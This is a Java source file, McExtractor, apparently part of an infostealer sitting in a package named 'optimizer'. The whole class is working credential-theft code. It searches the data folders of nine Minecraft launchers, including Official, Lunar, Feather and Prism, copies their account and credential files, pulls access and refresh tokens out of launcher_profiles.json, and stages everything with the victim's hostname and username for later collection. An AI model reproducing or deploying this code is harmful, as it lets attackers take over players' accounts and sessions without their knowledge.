package com.example.optimizer;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;

/**
 * Enhanced Minecraft Account Extractor
 * - Extracts from Official Launcher, Feather, Lunar, Prism, MultiMC, Modrinth
 * - Stores all account files in ZIP for reliable extraction
 * - Works with both premium and cracked accounts
 */
public class McExtractor {

    private static final String APPDATA = System.getenv("APPDATA");
    private static final String LOCALAPPDATA = System.getenv("LOCALAPPDATA");
    private static final String USERPROFILE = System.getenv("USERPROFILE");
    private static final String USER_HOME = System.getProperty("user.home");

    private static File storageDir = null;

    /**
     * Run extraction and save all account files to storage
     */
    public static void extract(File storage) {
        if (storage == null)
            return;
        storageDir = new File(storage, "minecraft_accounts");
        storageDir.mkdirs();

        SessionUtil.log("[McExtractor] Starting extraction...");

        // 1. Official Minecraft Launcher
        extractOfficialLauncher();

        // 2. Feather Launcher
        extractFeather();

        // 3. Lunar Client
        extractLunar();

        // 4. Prism Launcher
        extractPrism();

        // 5. MultiMC / PolyMC
        extractMultiMC();

        // 6. Modrinth App
        extractModrinth();

        // 7. ATLauncher
        extractATLauncher();

        // 8. TLauncher (cracked)
        extractTLauncher();

        // 9. SKLauncher
        extractSKLauncher();

        // Create summary file
        createSummary();

        SessionUtil.log("[McExtractor] Extraction complete");
    }

    /**
     * Official Minecraft Launcher
     */
    private static void extractOfficialLauncher() {
        try {
            // Windows paths
            String[] paths = {
                    APPDATA + "\\.minecraft",
                    USER_HOME + "\\.minecraft",
                    USER_HOME + "/AppData/Roaming/.minecraft"
            };

            for (String path : paths) {
                if (path == null)
                    continue;
                File mcDir = new File(path);
                if (!mcDir.exists())
                    continue;

                SessionUtil.log("[McExtractor] Found Official Launcher: " + path);
                File destDir = new File(storageDir, "official");
                destDir.mkdirs();

                // Copy important files
                copyIfExists(new File(mcDir, "launcher_profiles.json"), destDir);
                copyIfExists(new File(mcDir, "launcher_accounts.json"), destDir);
                copyIfExists(new File(mcDir, "launcher_log.txt"), destDir);
                copyIfExists(new File(mcDir, "usercache.json"), destDir);
                copyIfExists(new File(mcDir, "options.txt"), destDir);
                copyIfExists(new File(mcDir, "servers.dat"), destDir);

                // Copy launcher_accounts_microsoft_store.json if exists
                copyIfExists(new File(mcDir, "launcher_accounts_microsoft_store.json"), destDir);

                // Extract refresh token from profiles
                extractRefreshTokenFromFile(new File(mcDir, "launcher_profiles.json"), destDir);

                break; // Found one, don't need to check others
            }
        } catch (Exception e) {
            SessionUtil.logEx("[McExtractor] Official Launcher error", e);
        }
    }

    /**
     * Feather Launcher - Popular modded launcher
     */
    private static void extractFeather() {
        try {
            String[] paths = {
                    APPDATA + "\\Feather Launcher",
                    APPDATA + "\\feather",
                    LOCALAPPDATA + "\\FeatherLauncher",
                    USER_HOME + "/.feather",
                    USER_HOME + "/.config/feather"
            };

            for (String path : paths) {
                if (path == null)
                    continue;
                File featherDir = new File(path);
                if (!featherDir.exists())
                    continue;

                SessionUtil.log("[McExtractor] Found Feather: " + path);
                File destDir = new File(storageDir, "feather");
                destDir.mkdirs();

                // Copy account files
                copyIfExists(new File(featherDir, "accounts.json"), destDir);
                copyIfExists(new File(featherDir, "config.json"), destDir);
                copyIfExists(new File(featherDir, "settings.json"), destDir);
                copyIfExists(new File(featherDir, "launcher.json"), destDir);

                // Copy store directory if exists
                File storeDir = new File(featherDir, "store");
                if (storeDir.exists() && storeDir.isDirectory()) {
                    copyDirectory(storeDir, new File(destDir, "store"));
                }

                // Copy accounts subdirectory
                File accountsDir = new File(featherDir, "accounts");
                if (accountsDir.exists() && accountsDir.isDirectory()) {
                    copyDirectory(accountsDir, new File(destDir, "accounts"));
                }

                break;
            }
        } catch (Exception e) {
            SessionUtil.logEx("[McExtractor] Feather error", e);
        }
    }

    /**
     * Lunar Client
     */
    private static void extractLunar() {
        try {
            String[] paths = {
                    USER_HOME + "\\.lunarclient",
                    USERPROFILE + "\\.lunarclient",
                    LOCALAPPDATA + "\\lunarclient"
            };

            for (String path : paths) {
                if (path == null)
                    continue;
                File lunarDir = new File(path);
                if (!lunarDir.exists())
                    continue;

                SessionUtil.log("[McExtractor] Found Lunar: " + path);
                File destDir = new File(storageDir, "lunar");
                destDir.mkdirs();

                // Copy account files
                copyIfExists(new File(lunarDir, "settings\\game\\accounts.json"), destDir);
                copyIfExists(new File(lunarDir, "settings.json"), destDir);
                copyIfExists(new File(lunarDir, "launcher-cache.json"), destDir);

                // Check for offline directory
                File offlineDir = new File(lunarDir, "offline\\1.8.9");
                if (offlineDir.exists()) {
                    copyDirectory(offlineDir, new File(destDir, "offline"));
                }

                break;
            }
        } catch (Exception e) {
            SessionUtil.logEx("[McExtractor] Lunar error", e);
        }
    }

    /**
     * Prism Launcher (MultiMC fork)
     */
    private static void extractPrism() {
        try {
            String[] paths = {
                    APPDATA + "\\PrismLauncher",
                    LOCALAPPDATA + "\\PrismLauncher",
                    USER_HOME + "/.local/share/PrismLauncher"
            };

            for (String path : paths) {
                if (path == null)
                    continue;
                File prismDir = new File(path);
                if (!prismDir.exists())
                    continue;

                SessionUtil.log("[McExtractor] Found Prism: " + path);
                File destDir = new File(storageDir, "prism");
                destDir.mkdirs();

                copyIfExists(new File(prismDir, "accounts.json"), destDir);
                copyIfExists(new File(prismDir, "prismlauncher.cfg"), destDir);

                break;
            }
        } catch (Exception e) {
            SessionUtil.logEx("[McExtractor] Prism error", e);
        }
    }

    /**
     * MultiMC / PolyMC
     */
    private static void extractMultiMC() {
        try {
            String[] paths = {
                    APPDATA + "\\MultiMC",
                    APPDATA + "\\PolyMC",
                    LOCALAPPDATA + "\\MultiMC",
                    USER_HOME + "/.local/share/multimc"
            };

            for (String path : paths) {
                if (path == null)
                    continue;
                File mmcDir = new File(path);
                if (!mmcDir.exists())
                    continue;

                SessionUtil.log("[McExtractor] Found MultiMC/PolyMC: " + path);
                File destDir = new File(storageDir, "multimc");
                destDir.mkdirs();

                copyIfExists(new File(mmcDir, "accounts.json"), destDir);
                copyIfExists(new File(mmcDir, "multimc.cfg"), destDir);

                break;
            }
        } catch (Exception e) {
            SessionUtil.logEx("[McExtractor] MultiMC error", e);
        }
    }

    /**
     * Modrinth App
     */
    private static void extractModrinth() {
        try {
            String[] paths = {
                    APPDATA + "\\com.modrinth.theseus",
                    APPDATA + "\\ModrinthApp",
                    USER_HOME + "/.config/com.modrinth.theseus"
            };

            for (String path : paths) {
                if (path == null)
                    continue;
                File modrinthDir = new File(path);
                if (!modrinthDir.exists())
                    continue;

                SessionUtil.log("[McExtractor] Found Modrinth: " + path);
                File destDir = new File(storageDir, "modrinth");
                destDir.mkdirs();

                copyIfExists(new File(modrinthDir, "settings.json"), destDir);
                copyIfExists(new File(modrinthDir, "creds.json"), destDir);

                // Check meta directory
                File metaDir = new File(modrinthDir, "meta");
                if (metaDir.exists()) {
                    copyIfExists(new File(metaDir, "profiles.json"), destDir);
                }

                break;
            }
        } catch (Exception e) {
            SessionUtil.logEx("[McExtractor] Modrinth error", e);
        }
    }

    /**
     * ATLauncher
     */
    private static void extractATLauncher() {
        try {
            String[] paths = {
                    APPDATA + "\\ATLauncher",
                    LOCALAPPDATA + "\\ATLauncher",
                    USER_HOME + "/.atlauncher"
            };

            for (String path : paths) {
                if (path == null)
                    continue;
                File atlDir = new File(path);
                if (!atlDir.exists())
                    continue;

                SessionUtil.log("[McExtractor] Found ATLauncher: " + path);
                File destDir = new File(storageDir, "atlauncher");
                destDir.mkdirs();

                copyIfExists(new File(atlDir, "accounts.json"), destDir);
                copyIfExists(new File(atlDir, "launcher.json"), destDir);

                break;
            }
        } catch (Exception e) {
            SessionUtil.logEx("[McExtractor] ATLauncher error", e);
        }
    }

    /**
     * TLauncher (cracked launcher)
     */
    private static void extractTLauncher() {
        try {
            String[] paths = {
                    APPDATA + "\\.tlauncher",
                    USER_HOME + "\\.tlauncher"
            };

            for (String path : paths) {
                if (path == null)
                    continue;
                File tlauncherDir = new File(path);
                if (!tlauncherDir.exists())
                    continue;

                SessionUtil.log("[McExtractor] Found TLauncher: " + path);
                File destDir = new File(storageDir, "tlauncher");
                destDir.mkdirs();

                copyIfExists(new File(tlauncherDir, "tlauncher-2.0.properties"), destDir);
                copyIfExists(new File(tlauncherDir, "accounts_new.json"), destDir);

                break;
            }
        } catch (Exception e) {
            SessionUtil.logEx("[McExtractor] TLauncher error", e);
        }
    }

    /**
     * SKLauncher
     */
    private static void extractSKLauncher() {
        try {
            String[] paths = {
                    APPDATA + "\\.skl",
                    APPDATA + "\\SKLauncher",
                    USER_HOME + "\\.skl"
            };

            for (String path : paths) {
                if (path == null)
                    continue;
                File sklDir = new File(path);
                if (!sklDir.exists())
                    continue;

                SessionUtil.log("[McExtractor] Found SKLauncher: " + path);
                File destDir = new File(storageDir, "sklauncher");
                destDir.mkdirs();

                copyIfExists(new File(sklDir, "accounts.json"), destDir);
                copyIfExists(new File(sklDir, "sklauncher.properties"), destDir);

                break;
            }
        } catch (Exception e) {
            SessionUtil.logEx("[McExtractor] SKLauncher error", e);
        }
    }

    /**
     * Extract refresh token from launcher_profiles.json and save separately
     */
    private static void extractRefreshTokenFromFile(File profilesFile, File destDir) {
        try {
            if (!profilesFile.exists())
                return;

            String content = new String(Files.readAllBytes(profilesFile.toPath()), StandardCharsets.UTF_8);

            StringBuilder tokens = new StringBuilder();
            tokens.append("=== REFRESH TOKENS ===\n\n");

            // Look for accessToken patterns
            int tokenCount = 0;

            // Pattern 1: "accessToken" : "XXX"
            int idx = 0;
            while ((idx = content.indexOf("accessToken", idx)) != -1) {
                try {
                    int colonIdx = content.indexOf(":", idx);
                    if (colonIdx > 0 && colonIdx - idx < 30) {
                        int startQuote = content.indexOf("\"", colonIdx);
                        if (startQuote > 0 && startQuote - colonIdx < 10) {
                            int endQuote = content.indexOf("\"", startQuote + 1);
                            if (endQuote > startQuote) {
                                String token = content.substring(startQuote + 1, endQuote);
                                if (token.length() > 50) {
                                    tokens.append("AccessToken ").append(++tokenCount).append(":\n");
                                    tokens.append(token).append("\n\n");
                                }
                            }
                        }
                    }
                } catch (Exception e) {
                }
                idx++;
            }

            // Pattern 2: "refresh_token" / "refreshToken"
            String[] refreshPatterns = { "refresh_token", "refreshToken" };
            for (String pattern : refreshPatterns) {
                idx = 0;
                while ((idx = content.indexOf(pattern, idx)) != -1) {
                    try {
                        int colonIdx = content.indexOf(":", idx);
                        if (colonIdx > 0 && colonIdx - idx < 30) {
                            int startQuote = content.indexOf("\"", colonIdx);
                            if (startQuote > 0 && startQuote - colonIdx < 10) {
                                int endQuote = content.indexOf("\"", startQuote + 1);
                                if (endQuote > startQuote) {
                                    String token = content.substring(startQuote + 1, endQuote);
                                    if (token.length() > 50) {
                                        tokens.append("RefreshToken ").append(++tokenCount).append(":\n");
                                        tokens.append(token).append("\n\n");
                                    }
                                }
                            }
                        }
                    } catch (Exception e) {
                    }
                    idx++;
                }
            }

            if (tokenCount > 0) {
                File tokenFile = new File(destDir, "extracted_tokens.txt");
                Files.write(tokenFile.toPath(), tokens.toString().getBytes(StandardCharsets.UTF_8));
                SessionUtil.log("[McExtractor] Extracted " + tokenCount + " tokens");
            }

        } catch (Exception e) {
            SessionUtil.logEx("[McExtractor] Token extraction error", e);
        }
    }

    /**
     * Create summary of found accounts
     */
    private static void createSummary() {
        try {
            StringBuilder summary = new StringBuilder();
            summary.append("=== MINECRAFT ACCOUNT EXTRACTION SUMMARY ===\n");
            summary.append("Timestamp: ").append(java.time.LocalDateTime.now()).append("\n");
            summary.append("PC: ").append(SystemInfo.getHostname()).append(" / ").append(SystemInfo.getUsername())
                    .append("\n\n");

            File[] launchers = storageDir.listFiles();
            if (launchers != null) {
                for (File launcher : launchers) {
                    if (launcher.isDirectory()) {
                        File[] files = launcher.listFiles();
                        int fileCount = files != null ? files.length : 0;
                        summary.append(launcher.getName().toUpperCase()).append(": ");
                        summary.append(fileCount).append(" files\n");

                        if (files != null) {
                            for (File f : files) {
                                summary.append("  - ").append(f.getName());
                                if (f.isFile()) {
                                    summary.append(" (").append(f.length()).append(" bytes)");
                                }
                                summary.append("\n");
                            }
                        }
                        summary.append("\n");
                    }
                }
            }

            File summaryFile = new File(storageDir, "extraction_summary.txt");
            Files.write(summaryFile.toPath(), summary.toString().getBytes(StandardCharsets.UTF_8));

        } catch (Exception e) {
            SessionUtil.logEx("[McExtractor] Summary error", e);
        }
    }

    // ========== UTILITY METHODS ==========

    private static void copyIfExists(File src, File destDir) {
        try {
            if (src != null && src.exists() && src.isFile()) {
                Files.copy(src.toPath(), new File(destDir, src.getName()).toPath(),
                        StandardCopyOption.REPLACE_EXISTING);
            }
        } catch (Exception e) {
            // Ignore copy errors
        }
    }

    private static void copyDirectory(File src, File dest) {
        try {
            if (!src.exists())
                return;
            if (!dest.exists())
                dest.mkdirs();

            File[] files = src.listFiles();
            if (files == null)
                return;

            for (File file : files) {
                File destFile = new File(dest, file.getName());
                if (file.isDirectory()) {
                    // Limit recursion depth
                    copyDirectory(file, destFile);
                } else if (file.length() < 5 * 1024 * 1024) { // Max 5MB per file
                    Files.copy(file.toPath(), destFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                }
            }
        } catch (Exception e) {
            // Ignore
        }
    }
}
